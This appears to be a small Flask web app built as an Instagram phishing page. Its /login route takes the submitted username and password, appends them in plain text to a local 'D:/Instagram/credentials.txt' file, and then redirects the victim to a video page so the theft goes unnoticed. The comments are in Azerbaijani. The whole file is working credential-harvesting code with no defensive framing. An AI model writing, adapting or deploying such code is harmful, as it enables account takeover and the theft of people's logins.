from flask import Flask, request, redirect, render_template, url_for

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')  # HTML faylınızı burada çağırın

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Məlumatları credentials.txt faylında saxla
    with open('D:/Instagram/credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    
    # Login olandan sonra video səhifəsinə yönləndir
    return redirect(url_for('video'))

@app.route('/video')
def video():
    return render_template('video.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
